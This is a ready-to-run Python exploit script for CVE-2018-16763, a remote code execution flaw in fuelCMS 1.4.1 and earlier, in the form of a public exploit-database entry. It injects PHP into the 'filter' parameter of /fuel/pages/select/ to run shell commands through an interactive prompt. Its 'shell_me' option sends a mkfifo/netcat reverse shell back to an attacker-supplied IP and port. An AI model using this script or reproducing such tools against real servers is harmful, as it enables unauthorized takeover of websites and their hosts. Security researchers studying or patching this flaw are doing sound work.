#!/usr/bin/python3

# Exploit Title: fuelCMS 1.4.1 - Remote Code Execution
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763
# 



import requests
import sys
import urllib

from requests.sessions import extract_cookies_to_jar

class col:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"


def banner():
    banner = r"""
 ______         _ _____ ___  ___ _____ 
|  ___|        | /  __ \|  \/  |/  ___|
| |_ _   _  ___| | /  \/| .  . |\ `--. 
|  _| | | |/ _ \ | |    | |\/| | `--. \
| | | |_| |  __/ | \__/\| |  | |/\__/ /
\_|  \__,_|\___|_|\____/\_|  |_/\____/ 
Tested on 1.4                                       
"""
    banner += "Created by Cyberw1ng"
    return col.LIGHT_BLUE + banner + col.RESET


def help():
    banner = col.LIGHT_WHITE + "\n\tMenu\n"
    banner += col.LIGHT_GREEN
    banner += "\nexit     -\tExit app"
    banner += "\nshell_me -\tGet a reverse shell (netcat) "
    banner += "\nhelp     -\tShow this help\n"+ col.RESET
    return banner
    


print(banner())
print(help())

#http://10.10.12.27/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27ls%20-la%27)%2B%27

if len(sys.argv) != 2:
    print("\nUsage: python3 exploit.py Vulnerable IPADDRESS")
    sys.exit(0)

IP=sys.argv[1]

def parsePage(page):
    try:            
        page = page.split("<h4>A PHP Error was encountered</h4>")[0]
        page = page.split("<div")[0]
        page = page[6:]
        return page
    except:
        return False

try:
        
    while True:
        cmd = input(col.LIGHT_WHITE +"fuelCMS$ " + col.RESET)

        if cmd[0:4].lower() == "exit":
            print(col.RED + "Exiting..." + col.RESET)
            sys.exit(0)

        if cmd[0:8] == "shell_me":
            IP2, PORT = input(col.LIGHT_BLUE + "Enter your attacking machine IP:PORT $ " + col.RESET).split(":")
            nc = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP2} {PORT} >/tmp/f"
            cmd = nc
            print(col.LIGHT_GREEN + "\nHope you had your listener ready!!" + col.RESET)
            
        if cmd[0:4] == "help":
            print(help())
            continue
        
        if not "/tmp/f;mkfifo" in cmd:
            print(col.LIGHT_GRAY + "Sending request." + col.RESET)
        cmd = urllib.parse.quote(cmd)
        r = requests.get(f"http://{IP}/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27"+ cmd +"%27)%2B%27")
        if r.status_code == 200:
            page = parsePage(r.text)
            if page == "\n":
                print(col.RED + "No result" + col.RESET)
                continue
            print(col.LIGHT_GREEN+ f"\n{page.strip()}" + col.RESET)

except Exception as e:
    print(col.RED + f"An error occured, please try again...\n\n{e}" + col.RESET)